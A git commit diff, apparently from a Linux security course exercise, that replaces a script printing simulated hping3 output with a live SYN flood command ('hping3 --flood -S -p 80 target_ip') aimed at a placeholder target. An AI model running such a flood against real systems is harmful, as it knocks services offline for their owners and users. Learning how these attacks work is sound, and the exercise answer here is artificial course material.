9f20c77c0fc4624c8c33bf3d752f01ad612cf846
ii1ahe <ilaheqedirli16@gmail.com>
2025-11-01 22:16:37 -0400

    Update DOS script to use hping3 for flooding

--- linux_security/0x03_protocols_servers/7-dos.sh
+++ linux_security/0x03_protocols_servers/7-dos.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-printf 'hping3 %s (eth0 10.0.0.2): rand data\nUsing eth0, addr: 10.0.0.2, MTU: 1500\nhping3 %s (eth0 10.0.0.2) with 1460 data bytes\n' "$1" "$1"
+hping3 --flood -S -p 80 target_ip
